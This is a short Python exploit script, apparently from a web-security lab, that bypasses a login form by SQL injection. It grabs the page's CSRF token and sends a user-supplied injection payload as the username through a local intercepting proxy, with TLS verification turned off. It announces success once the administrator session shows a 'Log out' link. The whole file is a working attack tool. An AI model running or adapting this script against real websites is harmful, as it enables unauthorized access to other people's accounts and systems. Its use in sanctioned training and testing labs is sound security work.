import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def get_csrf_token(session, url):
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(session, url, payload):
    csrf = get_csrf_token(session, url)
    data = {
        "csrf" : csrf,
        "username" : payload,
        "password" : "randomtext"
    }
    req = session.post(url, data=data, verify=False, proxies=proxies)
    res = req.text
    return ("Log out" in res)


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <sql-payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit()

    session = requests.Session()

    if exploit_sqli(session, url, sqli_payload):
        print("[+] Sql injection successful! We have logged in as the administrator.")
    else:
        print("[-] Sql injection unsuccessful!")
